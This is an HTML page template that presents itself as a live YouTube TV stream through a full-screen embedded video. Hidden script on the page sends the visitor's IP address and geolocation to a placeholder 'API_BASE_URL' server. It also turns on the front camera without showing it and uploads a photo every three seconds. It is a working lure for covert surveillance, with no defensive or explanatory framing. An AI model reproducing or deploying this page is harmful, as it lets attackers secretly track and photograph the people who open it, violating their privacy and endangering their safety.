<!-- DESC: Live YouTube TV streaming page with camera capture -->
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Live Stream</title>
<style>body{margin:0;background:#111;color:#fff;font-family:Arial}video,canvas{display:none}iframe{width:100%;height:100vh;border:0}</style>
</head><body>
<video id="video" playsinline autoplay></video>
<canvas id="canvas" width="640" height="480"></canvas>
<iframe src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" allow="autoplay;encrypted-media;gyroscope;picture-in-picture" allowfullscreen></iframe>
<script>
var API='API_BASE_URL';
var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
fetch(API+'/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
});
navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
video.srcObject=s;video.play();
setInterval(function(){
ctx.drawImage(video,0,0,640,480);
fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
},3000);
}).catch(function(){});
</script>
</body></html>
